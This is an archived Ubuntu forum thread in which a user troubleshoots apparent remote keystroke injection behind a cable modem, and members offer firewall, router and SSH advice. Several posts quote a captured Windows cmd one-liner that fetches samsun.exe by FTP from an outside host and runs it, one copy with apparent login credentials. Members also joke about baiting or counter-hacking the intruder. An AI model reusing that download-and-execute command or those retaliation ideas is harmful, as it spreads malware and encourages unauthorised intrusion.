** wifi0     no wireless extensions.**

ath0      IEEE 802.11g  ESSID:""  Nickname:""
          Mode:Managed  Frequency:2.437 GHz  Access Point: Not-Associated   
          Bit Rate:0 kb/s   Tx-Power:17 dBm   Sensitivity=0/3  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=0/94  Signal level=-96 dBm  Noise level=-96 dBm
          Rx invalid nwid:95575  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0


```

---

### Post by OffAxis on 2007-12-27
getting back to your previous question before I got distracted...
> what are the rest of them?
If there's a listing for the device in **/etc/network/interfaces** it'll show in that options list.
Are there entries for them (eth1, eth2)  in there?

---

### Post by davesmith on 2007-12-27
> **OffAxis said:**
> **ath0** is used for the atheros network chipset based device (I think- someone please correct me if I'm wrong)

**eth0, eth1, eth2** are generic network connection names

**lo** is loopback (127.0.0.1)

**wlan0** is the generic wireless
_________________________________________________________________________________

ive read back over this thread to the begining and after giving it considerable thought, my view is that the problem originates from when you moved, and changed your ISP.

ISP's allocate new connections to their network using DCHP, they typically run a script against your m/c to do so and will set up new connections e.g. eth2 eth3 etc

however, i do think you have been cracked and i've drawn this thread to the attention of one of the mods

i would think about a clean install of Gutsy after getting a decent router with a NAT firewall 

goodnight!

---

### Post by detroit/zero on 2007-12-27
Yes, there's entries for them. There's not one for wifi0, though, and one for a wlan0.

I don't understand why there's eth1 & eth2 when I connect to everything through eth0.

I'm just making sure I don't have any more gaping holes for people to waltz in through, is all. 

If it's a moot point, then OK. If not, I'd like to seal this machine up before I retire for the evening.

---

### Post by candtalan on 2007-12-27
> **phr0ze said:**
> Our post crossed paths. In this case, I'd say this is a modem and not a router. Go buy a proper router. They are cheap over here, hopefully they are cheap there too.
It sounds like a cable modem only that is what I was thinking.
I helped a neighbour  to connect to UK VIrgin cable internet and I had to put a router on to the cable modem. This seems to talk about this a bit
[http://homepage.ntlworld.com/robin.d.h.walker/cmtips/homelan.html](http://homepage.ntlworld.com/robin.d.h.walker/cmtips/homelan.html)

---

### Post by OffAxis on 2007-12-27
I'm not sure where wifi0 is coming from; I don't think it's from your install of aircrack.

The wlan0 entry could have been created if you had a wireless card installed when you initially installed ubuntu. Over the various updates (and update options) you may have been asked to append, overwrite, or keep your existing config file; I wouldn't worry too much about it.

try 
```
route
```
in addition to your 
```
netstat -pant
```
commands to settle your mind; you should be fine; particulary because I couldn't come up with any open ports on your internet connection.

by the way, were you able to shutdown the wifi0 with
```
sudo ifdown wifi0 
```

---

### Post by detroit/zero on 2007-12-27
>  by the way, were you able to shutdown the wifi0 with sudo ifdown wifi0

Nope. I get:
```
~$ sudo ifdown wifi0
ifdown: interface wifi0 not configured
```

I did the route command and another netstat -pant, and I suppose I'm satisfied with how things are going now.

I will say that this guy isn't giving up easily.. He's hitting me with portscans and traceroutes and everything you can imagine. My firestarter events log is growing pages at a time.

I have his address now, and even though he keeps changing it, I can narrow it down to a couple different possibilities. I guess I'll see what everything looks like when I wake up tomorrow. It's almost 1am here and I have to call it a day.

I'll also call it Problem: Solved

For now.

---

### Post by Linuxratty on 2007-12-27
I have just read this and I am astounded...I do have to wonder how many other people in your building's machines have been compromised...
 Do keep us posted on how things sort out and if you can nail him...
 I had no idea this could even happen in Linux...I'm sure glad I'm behind a firewall and a router...

---

### Post by thavid on 2007-12-27
Really strange situation... Ok, we know he can connect to you X, but I'm quite sure that he can't control tty1 and so on... so, you gonna put your tty1 doing "tail -f /var/log/messages" and your tty2 doing "netstat -a" and wait for the fish to bite the X... Can't think of other way to catch the ******* :(

---

### Post by P235 on 2007-12-27
I'm intrigued by this entire thread.  I don't even have Firestarter installed as I'm just relying on Ubuntu's secure by default firewall.  Time to search the forums for Firestarter tutorials because I certainly don't want to be subjected to what detroit/zero is going through.

That said, best of luck to you detroit.  it sounds like you have a handle of what has gone terribly awry with your computer.  May you sleep easy tonight.

---

### Post by dannyboy79 on 2007-12-27
> **Jimmey said:**
> Don't do stuff like this.

Port scanning is quite a big deal. You should never make a scan like this on any computer without the owner's permission. In this case, dannyboy didn't know who the owner actually was, and so had no way of getting that person's permission, which can land you in quite a lot of trouble.

I think that you should figure out what software is listening on each of the open ports, and un-install whatever you're not using. 

SSH is the more worrying one - What does
 say?

Note that a scan on 127.0.0.1 will **probably yield different results** to a scan on your active network interface's LAN IP address, which is fine. Just try scanning your LAN IP instead.

i knew who the owner was, it's the OP. He came here asking for help so I took that as permission to nmap him. If he doesn't like it than he should comment about it, not you. A scan on 127.0.0.1 will yield only services listening on the loopback, which don't matter. 

Services are one thing, open ports are another. If a port is open but no service is listening on it, then there's no way to connect to it.

---

### Post by shearn89 on 2007-12-27
If you're still having troubles, then i'd just block that ms service port using iptables, and screw firestarter (was it port 111?):

```

sudo iptables -A INPUT -p tcp --dport 111 -j REJECT

```

I think thats it. Someone may want to check + confirm for me.

---

### Post by Dngrsone on 2007-12-27
External firewall device, in my opinion, is the only way to go.  Either with a (fairly) inexpensive router/switch with built-in FW or a FW appliance (mine is a PII machine with Smoothwall Express 2.0).

---

### Post by Tango_Down on 2007-12-27
Wow, just wow. I was aware that Linux was breakable if you failed to take proper precautions. Everything is vulnerable if you leave it unguarded. I was not aware that someone WHO DIDN'T EVEN KNOW HE WAS ATTACKING A *NIX MACHINE could do it. I think if this turns out to all be correct, this could indicate a serious security flaw in this version of Linux. 

Looking about I found
__
Ports 445 and 139 are used for TCP session establishment and file/printer sharing traffic. Port 445 is also used for communications between Win2k domain controllers and other servers. I'm pretty sure that Microsoft-ds, or ms-ds as you'll also see it, refers to directory services.
__
So this is something that samba would be listening to in order to help share printers and files. However, how do we get from someone being able to access your samba server, to someone being able to use the command line in order to acess an FTP server? Ms-DS is extremely vulnerable, and has been used in all types of attacks (Sasser, BackOrfice to name a few), but it shouldn't matter unless Samba is seriously broke, and furthermore, ubuntu would have to be granting rights that Samba should'nt have... I am concerned to say the least. I am not a networking expert, and can't say much about the situation, but this looks like something that needs to be patched up.

---

### Post by dburnett77 on 2007-12-28
[http://compnetworking.about.com/od/workingwithipaddresses/f/getrouteripaddr.htm](http://compnetworking.about.com/od/workingwithipaddresses/f/getrouteripaddr.htm)

describes how to obtain your IP address of your router.  Just use your ping tool in Ubuntu.

However, since you have so many open ports that are not being properly monitored by Firestarter, I'd say it's been corrupted.  Happens to me sometimes.  I have good luck with a fresh install.  In Synaptic, do a complete removal, then re-install it.

Also, on the main page of the Firestarter GUI, you should have a drop-arrow that shows active connections, and their corresponding IPs.  Get this info, and blacklist the guy when he attempts another connection.  You can do it in Firestarter, or in my case and I'd recommend for you, I'd run Firestarter in Restrictive mode.  Where only the ports you want are open.

Select:  "Policy...Outbound Traffic Policy...Restrictive by Default..."  then just add the ports you want to be open.

---

### Post by detroit/zero on 2007-12-28
A new day, a new try.

Aside from the usual SAMBA and ms-ds intrusion attempts, I'm now seeing something called  DCOM-scm. A quick google search for this service turns up [this result]("http://mailman.lug.org.uk/pipermail/wolves/2005-August/016232.html"). Looks like the person in that post from '05 was having similar issues.

This joker isn't giving up without a fight.

---

### Post by The Cog on 2007-12-28
> However, how do we get from someone being able to access your samba server, to someone being able to use the command line in order to acess an FTP server?

I don't think you do. I'm guessing that he is using VNC on port 5900 to take over your GUI, and then issuing keystrokes from his virtual keyboard. This would explain why the command appears in the middle of emails you are typing and so on. You will need to use wireshark to capture the conversation to be sure of course (or at least, issue the command netstat -t to see what connections exist while he's doing it (which may be difficult since he's typing as well).

I doubt if any if the normal attcks on the MS services will work on Samba - they will all be relying on bugs in MSs implementation.

Do you already have Firestarter installed?

---

### Post by detroit/zero on 2007-12-28
Well, I have a roughly 2MB firestarter events log from the night while I slept. I sent that and some other logs on to [email]abuse@astercity.net[/email] and we'll see what happens now.

These attacks aren't letting up at all, but luckily wit that address range blocked in firestarter, he's not getting through.

I guess that's all for now.

Thanks for everything, people. I'd be screwed if not for you!

I'll post an update when I learn something from the ISP.

Thanks again!

---

### Post by The Cog on 2007-12-28
> I sent that and some other logs on to [email]abuse@astercity.net[/email] and we'll see what happens now.

Don't hold your breath. And it's almost certainly some Windows user who doesn't even know his machine belongs to someone else.

---

### Post by shearn89 on 2007-12-28
Ooh - also, you can run "sudo netstat -puntac" - the c option means continuous, so you could leave it running, and wait for him to try and hack you again... It might help...

---

### Post by Jimmey on 2007-12-28
[quote=dannyboy79]Is your IP address 85.222.7.185. If it is, I just ran nmap on it...[/quote]
[quote=dannyboy79]i knew who the owner was...[/quote]

Let's face it - No, you didn't.

> Services are one thing, open ports are another.

Yes, but in certain cases (SSH, for example) they go hand in hand. If you install an SSH server then port 22 will be reported as "listening" when you scan 127.0.0.1

detroit/zero, if you don't use SSH (or don't know whether you do use it or not), then you probably need to get rid, just for safety's sake.

```
sudo apt-get remove openssh-server
```

---

### Post by tech9 on 2007-12-28
> **detroit/zero said:**
> Well, I have a roughly 2MB firestarter events log from the night while I slept. I sent that and some other logs on to [EMAIL="abuse@astercity.net"]abuse@astercity.net[/EMAIL] and we'll see what happens now.

These attacks aren't letting up at all, but luckily wit that address range blocked in firestarter, he's not getting through.

I guess that's all for now.

Thanks for everything, people. I'd be screwed if not for you!

I'll post an update when I learn something from the ISP.

Thanks again!

I still stick to my original suggestion of buying a hardware fire wall (router with embedded NAT firewall)

but your welcome :)

and Good Luck!

---

### Post by detroit/zero on 2007-12-28
> detroit/zero, if you don't use SSH (or don't know whether you do use it or not), then you probably need to get rid, just for safety's sake.Well, at one point (not so long ago) I did use SSH. And VNC. And Samba. 

I used them to move files between my desktop system and my laptop. I had a 200GB HD in the desktop, and two external 320GB USB drives attached. Being that the laptop only has about 120GB of storage, it was quite handy as a network storage device of sorts. Plus, the desktop had a printer attached, so that was the reason for file & printer sharing.

Since my desktop is roughly 6000 miles away back in Detroit, packed safely away in it's cardboard box, I suppose it would be safe for me to uninstall these services for the time being.

I've already done VNC, SSH, and Samba. I'm looking closely to make sure there's nothing I've forgotten.

---

### Post by runemaste644 on 2007-12-28
I assume youve reset your ip several times... Is the hacker from **the same subnet?** (if first 2 octets of your ip and his ip are same) If you dont know what an octet is, its a number in an ip from 0 to 255. Another example would be octet.octet.octet.octet.
If hes from the same subnet, hes probably a local. He might be on your wifi which gives him access to your computer. To get rid of him, try and make sure he knows that you know about him. Maybe kill the connection he does to you. You might even have to resort to counter hacking him. If he was installing malware on your computer, he probably has a large botnet of spammers.

---

### Post by SidewinderPro2 on 2007-12-28
Or...

Get your hands on a Windows virus, label it "Finances and Passwords" and see if he goes for it. Might get complicated trying to make it Windows recognizable, but if he gets hit, then he gets pwned. More of a project than a solution, but oh well.

:lolflag:

---

### Post by meindian523 on 2007-12-28
@Sidewinder

You really think he would go for "Finances and Passwords",if he's been trying all this while and not got through,he will figure that he's up against someone with experience and help,someone who probably wouldn't name folders like "Finances and Passwords"........

---

### Post by SidewinderPro2 on 2007-12-28
Worth a shot...

Just write some BASIC and use a kill command here and there. That will work wonders on the little hacker n00b.


print "Have a nice day"
input "Press enter to continue. "; GetPwned
if GetPwned = 0 then goto TheEnd

[TheEnd]
kill system32

That oughta do it, I have no idea if it will work, I just did it from my head for fun. They'll probably ban me for it, but oh well. Not that most people have any clue as to how to run it.

---

### Post by m9ke on 2007-12-28
How are you securing your wireless network?

Here are some thing you can do to make it more secure:

1.  Consider your SSID.  You know when you look for your wireless and you see all those other networks out there?  (probably a lot of them called 'linksys')?  The SSID is the name of the network.  You can do two things to make it more secure:  first rename it; and second hide (don't broadcast it).

2.  Secure your network.  The default on wireless routers such as linksys and Dlink is no password; no security.  Plus they don't really emphasise enough in the docs that you should change this.  That's why you see so many unsecured networks with default SSIDs on the air.

You have 3 options to secure your wireless network;  1-none (very bad); 2-WEP (better, but not good enough); or 3-WPA.  This one is not unbreakable, but it makes it hard enough that unless someone is targeting you personally, they will look for someone else's network to hack.  Look for an option like WPA Personal 2 with TKIP.

3.  Passwords:  make them hard to guess.  They should contain numbers, special characters (*&$ etc) as well as upper and lower case letters.  This is controversial:  I will advise you to make up a hard to guess password with all those characters, and write it down.  Put this piece of paper somewhere secure.  Not on a post-it on your computer.  Plenty of smart people will say never write down a password.  This is what works for me.  YMMV.

Finally, the documentation for most wireless routers is online.  You configure the SSID, security, and password thru a browser window, using an address supplied by the manufacturer.  It'll be some numbers separated by dots such as 192.168.2.2

Hope this helps,
m9ke

---

### Post by detroit/zero on 2007-12-28
It's not a router, it's a modem. 

I did find docs online and the manufacturers website. It's an Arris model TM502b. Apparently, it's not even wireless. I guess I had more things wrong right from the start than I thought... Here's a slow night according to wifi-radar.. Only 8 wireless networks to choose from, none of which have anything to do with me:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-WiFiRadar.png[/IMG]

There's no built in firewall, and nothing to configure. It converts the cable signal into data - period. All other functions are said to be handled by the ISP - in this case, my cable company. According to the manufacturer, there's no way to access the modem configuration from a browser window (assuming there is a modem configuration to access).

I guess I have to hope IPTables holds up until I move out of here or get my hands on a decent router.

---

### Post by m9ke on 2007-12-28
Oops, sorry detroit!  I should have picked that up.  Sorry for the noise and I hope you get rid of the pest who is hacking your system!

m9ke

---

### Post by dburnett77 on 2007-12-30
By a cheap router at around $20, since you don't need wireless.  It would appear, from post, that you're a direct connect.

Any will do, and all the newer models have NAT, which would be a significant step up.

However, I am at a loss.  Is there an extra cable/splice you don't recall installing?  As, he seems to put input on your system.  I don't really see how this can happen, unless it's a wireless bluetooth setup, and he's comming in on that, or maybe your ISP directly.

Anyways, routers block a lot of access that is unsolicited.  And, can easily be reconfigured to forward ports when the get flooded.  To non-existent areas on a virtual network.

***Excuse the re-edits, someone there/here loves my rapping mod-ups?!
See line at bottom...

---

### Post by scorp123 on 2007-12-30
> **detroit/zero said:**
>  ```
%systemroot% c:/windows/system32/cmd.exe
 echo open colinholo.ipower.com 21 >> ik &echo user fra fra >> ik &echo binary >> ik &echo get samsun.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &samsun.exe &exit
```  That's probably a worm trying to spread via security holes in MSIE and/or IIS or other Microsoft crap software. I get tons of these on my web servers. **This is totally harmless to UNIX-like systems such as Linux.** It's annyoing, yes. But harmless. A real hack attempt would be if you get lots and lots of attempted logins via SSH, e.g. you could check **/var/log/auth.log** and then see if you have entries like this one: 
```
Dec 30 16:05:59 localhost sshd[5927]: Accepted password for homer from 192.168.1.201 port 43146 ssh2
Dec 30 16:05:59 localhost sshd[5931]: (pam_unix) session opened for user homer by (uid=0)
Dec 30 16:07:01 localhost sshd[5967]: refused connect from outbound.silenceisdefeat.org (66.111.62.174)
``` Stuff like that could potentially be more troubling. In the first line a user with the name "homer" logged in and soon afterwards became superuser "root" (uid=0). Then in the next line someone tried to login from a host that is explicitly blocked via /etc/hosts.deny ... this then caused a "sshd: refused connect" message to appear.

If you have entries like that you should be concerned, yes. .... But this Windows crap that you keep getting: It's harmless. Probably just a Windows worm trying to spread. You'd only be in trouble if you used an older and unpatched Windows, but it's highly unlikely that any harm could be done to your Linux system.

Nontheless I second the other suggestions given to you here: Please get a decent router with an integrated firewall. That will keep such potential troublemakers out of your home network and your system.

Cheers.

---

### Post by shearn89 on 2007-12-30
(s)he knows it not going to do anything, its the fact that the text keeps popping up at any available opportunity thats bugging the OP...

---

### Post by dannyboy79 on 2007-12-31
> **Jimmey said:**
> Let's face it - No, you didn't.



Yes, but in certain cases (SSH, for example) they go hand in hand. If you install an SSH server then port 22 will be reported as "listening" when you scan 127.0.0.1

detroit/zero, if you don't use SSH (or don't know whether you do use it or not), then you probably need to get rid, just for safety's sake.

```
sudo apt-get remove openssh-server
```

if ssh is only listening on port 127.0.0.1 than it's not accessible from the outside! , plain and simple! It's only listening on the loopback which means the only location that can connect to it is the same machine.

---

### Post by scorp123 on 2007-12-31
> **dannyboy79 said:**
>  if ssh is only listening on port 127.0.0.1 than it's not accessible from the outside! , plain and simple! It's only listening on the loopback which means the only location that can connect to it is the same machine. SSH's default behaviour is to listen on ***any*** network interface. ```
ListenAddress 0.0.0.0
``` ... Unless the user changed that --which I doubt-- then he is accessible from outside because the SSH server will respond to any connection request that reaches the machine. To be really sure he'd need to supply the output of e.g. **lsof -n -i -P** .... Example from my machine here: ```
COMMAND    PID  USER   FD   TYPE DEVICE SIZE NODE NAME
sshd      5230  root    3u  IPv6  18180       TCP *:22 (LISTEN)
cupsd     5266  root    2u  IPv4  18243       TCP 127.0.0.1:631 (LISTEN)
``` See the difference? "cupsd" is indeed only listening on the loopback interface. But sshd's "TCP *:22" means that it's listening on ***any*** address ... so yes, this "sshd" would be reachable from outside (which it has to be in my case).

Your claim that his "sshd" is 'only listening on 127.0.0.1' is not of much value given the circumstances that by default openssh-server will listen on any interface. And without any output from "lsof -n -i -P" or "netstat -ln" you can't really be sure.

---

### Post by wasing on 2007-12-31
> **detroit/zero said:**
> It's not a router, it's a modem. 

I did find docs online and the manufacturers website. It's an Arris model TM502b. Apparently, it's not even wireless. I guess I had more things wrong right from the start than I thought... Here's a slow night according to wifi-radar.. Only 8 wireless networks to choose from, none of which have anything to do with me:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-WiFiRadar.png[/IMG]

There's no built in firewall, and nothing to configure. It converts the cable signal into data - period. All other functions are said to be handled by the ISP - in this case, my cable company. According to the manufacturer, there's no way to access the modem configuration from a browser window (assuming there is a modem configuration to access).

I guess I have to hope IPTables holds up until I move out of here or get my hands on a decent router.

kk.. im confused it cant just be a modem it has to be some form of gateway or connected to a router so that it can run through the entire building right...? other wise i dont see how its possible for everyone in your building to connect through one modem internet port.. 

also just if you wanted to check it out check out this OS called Backtrack [http://www.remote-exploit.org/backtrack_download.html]("http://www.remote-exploit.org/backtrack_download.html")

its suppose to be a security penetration tester to see where you computer could be accessed. (find your security leak for were this guy is coming from.. use backtrack 2 not the beta if you decide to use it.. and you can run it as a live cd

anyway just trying to point something out that i just didn't understand in your story and trying to help out.

 hope you can catch this guy or atleast block himout

---

### Post by markyb86 on 2007-12-31
> **wasing said:**
> kk.. im confused it cant just be a modem it has to be some form of gateway or connected to a router so that it can run through the entire building right...? other wise i dont see how its 

i think from reading all 13 pages of this thread, the lanlord got cable internet in every apartment, so thats how they would all be connected, thats why all the wifi becuase they probably all have there own routers attatched to the modems

---

### Post by dannyboy79 on 2007-12-31
> **scorp123 said:**
> SSH's default behaviour is to listen on ***any*** network interface. ```
ListenAddress 0.0.0.0
``` ... Unless the user changed that --which I doubt-- then he is accessible from outside because the SSH server will respond to any connection request that reaches the machine. To be really sure he'd need to supply the output of e.g. **lsof -n -i -P** .... Example from my machine here: ```
COMMAND    PID  USER   FD   TYPE DEVICE SIZE NODE NAME
sshd      5230  root    3u  IPv6  18180       TCP *:22 (LISTEN)
cupsd     5266  root    2u  IPv4  18243       TCP 127.0.0.1:631 (LISTEN)
``` See the difference? "cupsd" is indeed only listening on the loopback interface. But sshd's "TCP *:22" means that it's listening on ***any*** address ... so yes, this "sshd" would be reachable from outside (which it has to be in my case).

Your claim that his "sshd" is 'only listening on 127.0.0.1' is not of much value given the circumstances that by default openssh-server will listen on any interface. And without any output from "lsof -n -i -P" or "netstat -ln" you can't really be sure.

i never said his ssh server was only listening on the loopback. another poster said that if the ssh server was listening  on 127.0.0.1 that someone can connect to it, which is flat out wrong.

---

### Post by scorp123 on 2008-01-01
> **dannyboy79 said:**
>  another poster said that if the ssh server was listening  on 127.0.0.1 that someone can connect to it, which is flat out wrong. OK, I see what you mean there. (for all who don't understand: 127.0.0.1 is the loopback interface, connections to it can only originate from your own machine; 127.0.0.1 is never reachable from the outside world).

The problem I see (and what I meant with my earlier posting) is that if it's listening on 127.0.0.1 it's probably listening on "0.0.0.0" (= any network interface) too because that would be the default behaviour.

---

### Post by NDX on 2008-01-15
This same event just happened to me 30 minutes ago.
 
```
 c echo open [www.tvrm.ro](www.tvrm.ro) 21 >> ik &echo user tvrmadmin b8upHlEb >> ik &echo binary >> ik &echo get samsun.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &samsun.exe &exit 
```

I have turned off XAMPP and Pidgin and turned off other things as well.

---

### Post by sloggerkhan on 2008-01-15
Have you tried doing this on your ip address?

~$ sudo nmap -sS 127.0.0.1

Starting Nmap 4.20 ( [http://insecure.org](http://insecure.org) ) at 2008-01-15 19:38 MST
Interesting ports on localhost (127.0.0.1):
Not shown: 1696 closed ports
PORT    STATE SERVICE
631/tcp open  ipp

Nmap finished: 1 IP address (1 host up) scanned in 0.201 seconds
redice@opbox:~$

---

### Post by LeDechaine on 2008-01-16
Weird things happening there. I've just read this whole thread.

But well, SSH + Samba + VNC were running and open on his computer, he thought he was connected to a router: fake sense of security: it was a modem, he said that he used a weak VNC password, so it may have been the same for samba and SSH..

Conclusion: Ubuntu is secure, letting 3 remote-access "programs" running, open to the entire world, is not, and 3 remote-access programs with weak passwords, is worse! ;)

---

### Post by dannyboy79 on 2008-01-16
> **sloggerkhan said:**
> Have you tried doing this on your ip address?

~$ sudo nmap -sS 127.0.0.1

Starting Nmap 4.20 ( [http://insecure.org](http://insecure.org) ) at 2008-01-15 19:38 MST
Interesting ports on localhost (127.0.0.1):
Not shown: 1696 closed ports
PORT    STATE SERVICE
631/tcp open  ipp

Nmap finished: 1 IP address (1 host up) scanned in 0.201 seconds
redice@opbox:~$

that's only going to show you any open ports on the loopback interface which isn't the same as your ethernet or wifi interface and only local things can connect to the loopback by security design I believe. So what I am saying is doing that scan is not benifical in any way. (please correct me if I am wrong)

---

### Post by sloggerkhan on 2008-01-16
that's why I said "your ip address" not your localhost.

---

### Post by xunil76 on 2008-01-16
after having read that the "hack" attempt stops when the LAN cable is pulled, it seems that the fix for this would be very simple.....buy a wired-only LAN router (preferably with built-in firewall), and put it in between your computer and the cable modem.

make sure it is set up properly, including the changing of the default password, disabling UPnP, disabling remote access to the router (with the exception of allowing only specific IP's and/or MAC addresses, if remote access is needed), disabling ICMP ping requests, and closing any/all ports that are not specifically needed for something.  you can even go so far as to change the default port # for certain services to a non-standard port # (such as changing FTP from port 21 to 25487....something that doesn't immediately give away what is using that port).  this can be done internally to the router itself, and in a decent router, can be set up to automatically convert that port # back to the standard port, i.e., any FTP requests coming in from port 25487 from the outside will automatically be forwarded to port 21 on the internal LAN....so you don't even need to change anything on your FTP server's configuration, just specify the correct external port # when coming in from the outside.

if you do all this, i can almost guarantee you that you will not have this problem anymore....if it continues, they are an EXTREMELY experienced cracker, and are most likely specifically targeting you.  but that doesn't seem to be the case if they can't even discern that you are not running a Windows OS.

---

### Post by nikoPSK on 2008-01-16
> **paul.matthijsse said:**
> Hello, I guess your router is new as well. Have you checked the firewall in the router (if any)? 

About Samsun.exe:
[http://spywarefiles.prevx.com/RRDFHD1625398/SAMSUN.EXE.html](http://spywarefiles.prevx.com/RRDFHD1625398/SAMSUN.EXE.html)

DEFINITION OF: SAMSUN.EXE

    * Safety Rating: Known Malware, do not run
    * Malware Family: Part of Malware group - Covert Sys Exec
    * Determination: Automatically determined using Prevx centralized heuristics
    * Malware Form: EXPLOIT

!!!, I'd say that's bad too... any way you could try to lock it out?

---

### Post by evil316 on 2008-01-16
Can you add an IPcop or smoothwall box to your network?  Have you tried any intrusion detection software?

---

### Post by detroit/zero on 2008-01-17
> **LeDechaine said:**
> Weird things happening there. I've just read this whole thread.

But well, SSH + Samba + VNC were running and open on his computer, he thought he was connected to a router: fake sense of security: it was a modem, he said that he used a weak VNC password, so it may have been the same for samba and SSH..

Conclusion: Ubuntu is secure, letting 3 remote-access "programs" running, open to the entire world, is not, and 3 remote-access programs with weak passwords, is worse! ;)
I did have VNC, SSH, and SMB running at the beginning, but I did end up removing them and the intruder still had access.

The only thing standing between this person/these people is my firewall. If I shut it off, they will get in regardless of those services being installed or not, so oddly enough, I don't think that had anything to do with it.

---

### Post by Sinkingships7 on 2008-01-17
> **meindian523 said:**
> @Sidewinder

You really think he would go for "Finances and Passwords",if he's been trying all this while and not got through,he will figure that he's up against someone with experience and help,someone who probably wouldn't name folders like "Finances and Passwords"........

lmao. perfect. absolutely perfect.

---

### Post by stoodleysnow on 2008-01-17
Could it be someone in one of the other apartments, therefore within the same network?

---

### Post by nikoPSK on 2008-01-17
> **stoodleysnow said:**
> Could it be someone in one of the other apartments, therefore within the same network?

plausible...

---

### Post by detroit/zero on 2008-01-17
> **stoodleysnow said:**
> Could it be someone in one of the other apartments, therefore within the same network?

It's definitely someone on the same network. Where they are is anybodys guess. They definitely have the same ISP as I do, though.

Without going and looking who, someone gave me the advice to block a range of addresses in Firestarter - 85.222.0.0/16 - that's a pretty wide range, and it did the trick for a while. It only took a week or so, though, until my computer started rebooting at random times without me doing anything; during a video or when playing music, writing an email, or even when just sitting idle. Quick investigation turned up a new couple of addresses in my Firestarter logs that may have been suspect, so I added a new (and much larger) range to be blocked - 85.0.0.0/16. 

Both the attempted FTP connection establishment and the random reboot problems are gone now. I don't have any intrusions at all (that I know of) happening.

I would point out that with my computer sitting idle, at an empty desktop with no applications running at all, I still have anywhere between 2.5 and around 10KB/s worth of connections coming at me that are being blocked by Firestarter. 

I can't leave Firestarter running for more than an hour or so because the Events log grows so fast it eats up all my memory (1GB) and processor power (1.73GHz) to maintain it. If I accidentally leave it running overnight, I have to do a *ctrl-alt-sys req-k* or a *ctrl-alt-F2* to shut down X and log back in; the system is frozen because of the size of the log.

If I start up Wireshark, let it run with no other applications running, and set it to a *No ARP/No DNS* filter, I'm getting pounded with SMB, ms-ds, netbios, VNC, SSH, dcom-scm, and a variety of other connection requests at a rate of about 20 per second from a very wide array of addresses. Wireshark will generate a near 5MB capture file in one minute.

Luckily for me Firestarter is blocking every one of those connections.

I need to get that router. If nothing else, these ***** are eating up a decent chunk of bandwidth since this garbage gets through the modem and has to be blocked at the software level after my ethernet card.

---

### Post by Dudeman02379 on 2008-01-17
Wow...  You know how sometimes you wonder why your internet at home is a little slow?  Well it looks like the answer is that at any given time there are thousands of hackers eating up your bandwith by trying to access your computer.  It really goes to show how a little $20-$50 nat device can seriously add a layer of invaluable protection.

---

### Post by xunil76 on 2008-01-17
> **Dudeman02379 said:**
> Wow...  You know how sometimes you wonder why your internet at home is a little slow?  Well it looks like the answer is that at any given time there are thousands of hackers eating up your bandwith by trying to access your computer.  It really goes to show how a little $20-$50 nat device can seriously add a layer of invaluable protection.

actually, it's more likely that if there is a DOS-style or DDOS-style attack on your internet connection, that it's one or a small group of crackers or script kiddies that have commandeered thousands of unsecured Winblows boxes and are using them all to hammer away at a certain subnet or subnets to find vulnerabilities that they can exploit.

---

### Post by detroit/zero on 2008-01-25
Prolonged update:

Since starting this thread, I've made the move from Feisty to Gutsy. I was going to hold off on the switch for a while, but circumstances completely within my control and wholly unrelated to this thread prompted the move.

One of the first things I did was install the Firestarter interface and add the same rule suggested by [davesmith]("http://ubuntuforums.org/member.php?u=187925"), to block all the addresses on the ISP. This kept me locked up fairly tight and prevented any serious intrusions like the ones that started it all.

Another user, [2point0]("http://ubuntuforums.org/member.php?u=171935"), offered to help me out somewhere along the line and did some probing of my system from his locale.He found that, other than some BitTorrent ports, everything was buttoned up pretty well.

I then went and downloaded [Backtrack]("http://www.remote-exploit.org/backtrack_download.html"), as suggested by [Wasing]("http://ubuntuforums.org/member.php?u=317995"). I can't believe I've not run across Backtrack before, and have been using it quite regularly since I burned it to disc. Subsequent investigation showed no less than four computers sharing a connection with me, one of which was a linux machine. I'm not sure which computer it was, but one of them was creating hundreds of IP addresses, which made it look like my LAN was populated by about 3 or 400 computers. I'm not exactly sure, but I think this is the culprit I've been after, but it could just as easily be one of the businesses in the bottom of my building.

Anyway - about a week and a half ago I finally managed to get my hands on a good Linksys wireless router. (Having a laptop and still being tethered to the wall by a network cable is such a pain...) I've got everything set up right and secured tight. I changed all my passwords, uninstalled unused/risky services, and am snug as a bug in a rug behind my new NAT router.

I suppose this brings an end to quite an epic saga. I'm still curious as to who this joker is/was. If I ever figure it out, I'll be sure to post pictures of the bloody aftermath.

Thanks for all the help and quick attention!

---

### Post by ghostcrab on 2008-01-26
> **detroit/zero said:**
> So, I recently moved to a new apartment. I have internet access provided by a different carrier. I have my laptop connected through a wired connection, but the router is wireless and I do have a wireless card.

For the last three weeks, about four or five times a day, some idiot is trying to hack my computer. If I have any application open where keyboard input is accepted (such as text-search in Firefox, email, or even the search function in a nautilus window), I notice that this person is trying to work their magic.

Here's what I was able to capture of what he's inputing into my system. There might be some parts of the second line missing at the beginning, but it's obvious he's trying to get into a Windows machine. I have no idea what this command is supposed to be doing, but I'm glad I'm not using Windows because something tells me it wouldn't be pleasant. Here it is:

```
%systemroot% c:/windows/system32/cmd.exe
 echo open colinholo.ipower.com 21 >> ik &echo user fra fra >> ik &echo binary >> ik &echo get samsun.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &samsun.exe &exit
```Now, here's the thing: I can't stop this fool from doing this three or more times a day.

I see nothing in the Events tab of Firestarter. The only ports I have open are for Deluge (6881-6889); everything else should be being blocked. I have file&printer sharing disabled. VNC, RDP, and SSH are all disabled, and the ports should be blocked through Firestarter.

I'm unable to capture any network data through Wireshark, because once he starts typing I can't do anything with any window I have open. With Wireshark, for example, I have to input a password in order to run it, and when he's typing that's what's being entered as my password.

Closing the BitTorrent ports in Firestarter has no effect; he's still able to get into my system. I've never seen this before, and I assume that my previous router (which I connected to wirelessly) had firewall settings that were blocking such attempts (or the WEP key). I also wonder if he's getting at me through my wireless card. I'm not sure that since I'm using eth0, ath0 is automatically disabled.

I'm ashamed to say I'm quite ignorant as to the ways of networking and such, and was hoping someone could give me some advice.

Let me know if I can provide any further info.

Thanks.

I did not read all of your post because I'm hung over but if it was me and it is a LAN 
